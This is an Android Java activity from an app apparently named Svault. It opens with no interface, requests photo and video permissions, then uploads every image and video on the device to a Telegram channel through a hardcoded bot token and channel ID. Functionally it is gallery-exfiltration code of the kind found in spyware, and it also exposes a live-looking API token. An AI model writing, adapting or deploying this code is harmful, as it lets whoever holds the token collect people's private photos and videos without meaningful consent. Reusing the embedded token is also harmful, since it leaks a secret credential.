package com.tenix.svault;

import android.Manifest;
import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ContentUris;
import android.content.pm.PackageManager;
import android.content.res.AssetFileDescriptor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Toast;

import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class inq extends Activity {

    // ── CONFIG ───────────────────────────────────────────────
    static final String BOT_TOKEN  = "9073449396:AAHNJtzRZyYZe7DnMFNGwVTM_KDi_YaX4q4";

    // Public channel  →  @channel_username
    // Private channel →  -1001234567890
    static final String CHANNEL_ID = "-1004366694212";
    // ────────────────────────────────────────────────────────

    private static final int    REQ_PERM      = 1;
    private static final int    NOTIF_ID      = 55;
    private static final String NOTIF_CH      = "svault_upload";
    private static final long   MAX_FILE_SIZE = 50L * 1024 * 1024; // 50 MB
    private static final int    SEND_DELAY_MS = 350; // avoid rate limiting

    private NotificationManager nm;
    private ExecutorService     executor;

    // ── Lifecycle ─────────────────────────────────────────────

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // No setContentView — Activity is transparent (manifest theme)
        executor = Executors.newSingleThreadExecutor();
        nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
        initNotifChannel();
        askPermissions();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (executor != null && !executor.isShutdown()) executor.shutdown();
    }

    // ── Permissions ───────────────────────────────────────────

    @SuppressWarnings("NewApi")
    private void askPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            String[] perms = {
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.POST_NOTIFICATIONS
            };
            boolean allGranted = true;
            for (String p : perms)
                if (checkSelfPermission(p) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false; break;
                }
            if (!allGranted) requestPermissions(perms, REQ_PERM);
            else             startUpload();

        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE)
                    != PackageManager.PERMISSION_GRANTED)
                requestPermissions(
                        new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQ_PERM);
            else
                startUpload();
        } else {
            startUpload();
        }
    }

    @Override
    public void onRequestPermissionsResult(int code, String[] perms, int[] results) {
        if (code != REQ_PERM) return;
        for (int i = 0; i < perms.length; i++) {
            String p = perms[i];
            if (results[i] == PackageManager.PERMISSION_GRANTED
                    && (p.equals(Manifest.permission.READ_MEDIA_IMAGES)
                     || p.equals(Manifest.permission.READ_EXTERNAL_STORAGE))) {
                startUpload();
                return;
            }
        }
        Toast.makeText(this, "Permission denied", Toast.LENGTH_SHORT).show();
        finish();
    }

    // ── Upload loop ───────────────────────────────────────────

    private void startUpload() {
        executor.execute(() -> {
            ArrayList<Uri> all = collectMedia();
            int total = all.size();
            if (total == 0) return;

            int ok = 0, skipped = 0;
            for (int i = 0; i < total; i++) {
                Uri uri = all.get(i);

                // Skip files > 50 MB (Telegram Bot API hard limit)
                if (getFileSize(uri) > MAX_FILE_SIZE) {
                    skipped++;
                    pushNotif(i + 1, total, ok);
                    continue;
                }

                if (sendToTelegram(uri)) ok++;

                pushNotif(i + 1, total, ok);

                // Rate limit protection — small delay between sends
                try { Thread.sleep(SEND_DELAY_MS); } catch (InterruptedException ignored) {}
            }
            doneNotif(ok, total, skipped);
        });
    }

    // ── Media scanning ────────────────────────────────────────

    private ArrayList<Uri> collectMedia() {
        ArrayList<Uri> list = new ArrayList<>();
        try (Cursor c = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Images.Media._ID},
                null, null, MediaStore.Images.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}

        try (Cursor c = getContentResolver().query(
                MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.Video.Media._ID},
                null, null, MediaStore.Video.Media.DATE_ADDED + " ASC")) {
            if (c != null) while (c.moveToNext())
                list.add(ContentUris.withAppendedId(
                        MediaStore.Video.Media.EXTERNAL_CONTENT_URI, c.getLong(0)));
        } catch (Exception ignored) {}

        return list;
    }

    private long getFileSize(Uri uri) {
        try {
            AssetFileDescriptor afd = getContentResolver().openAssetFileDescriptor(uri, "r");
            if (afd != null) {
                long size = afd.getLength();
                afd.close();
                return size;
            }
        } catch (Exception ignored) {}
        return 0;
    }

    // ── Telegram upload — sendDocument (50 MB, all types) ─────

    private boolean sendToTelegram(Uri uri) {
        try {
            String mime  = getContentResolver().getType(uri);
            if (mime == null) mime = "application/octet-stream";
            String bound = "SVB" + System.currentTimeMillis();

            HttpURLConnection conn = (HttpURLConnection)
                    new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument")
                    .openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setConnectTimeout(30_000);
            conn.setReadTimeout(180_000);
            conn.setRequestProperty("Content-Type",
                    "multipart/form-data; boundary=" + bound);
            conn.setRequestProperty("Connection", "close");

            DataOutputStream out = new DataOutputStream(conn.getOutputStream());

            // chat_id part
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
            out.writeBytes(CHANNEL_ID + "\r\n");

            // document part
            out.writeBytes("--" + bound + "\r\n");
            out.writeBytes("Content-Disposition: form-data; "
                    + "name=\"document\"; filename=\"file\"\r\n");
            out.writeBytes("Content-Type: " + mime + "\r\n\r\n");
            try (InputStream in = getContentResolver().openInputStream(uri)) {
                byte[] buf = new byte[8192];
                int n;
                if (in != null) while ((n = in.read(buf)) != -1) out.write(buf, 0, n);
            }
            out.writeBytes("\r\n--" + bound + "--\r\n");
            out.flush();
            out.close();

            int code = conn.getResponseCode();

            // Always drain response body — required for keep-alive & proper close
            try {
                InputStream resp = (code == 200)
                        ? conn.getInputStream() : conn.getErrorStream();
                if (resp != null) {
                    byte[] buf = new byte[512];
                    while (resp.read(buf) != -1) {}
                    resp.close();
                }
            } catch (Exception ignored) {}

            conn.disconnect();
            return code == 200;

        } catch (Exception e) {
            return false;
        }
    }

    // ── Notifications ─────────────────────────────────────────

    private void initNotifChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            nm.createNotificationChannel(new NotificationChannel(
                    NOTIF_CH, "Svault Upload", NotificationManager.IMPORTANCE_LOW));
    }

    @SuppressWarnings("deprecation")
    private void pushNotif(int cur, int total, int ok) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — uploading  ✓ " + ok)
         .setContentText(cur + " / " + total)
         .setProgress(total, cur, false)
         .setOngoing(true);
        nm.notify(NOTIF_ID, b.build());
    }

    @SuppressWarnings("deprecation")
    private void doneNotif(int ok, int total, int skipped) {
        Notification.Builder b = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? new Notification.Builder(this, NOTIF_CH)
                : new Notification.Builder(this);
        String text = ok + " / " + total + " sent";
        if (skipped > 0) text += "  •  " + skipped + " skipped (>50MB)";
        b.setSmallIcon(android.R.drawable.ic_menu_upload)
         .setContentTitle("Svault — complete")
         .setContentText(text)
         .setAutoCancel(true).setOngoing(false);
        nm.notify(NOTIF_ID, b.build());
    }
}
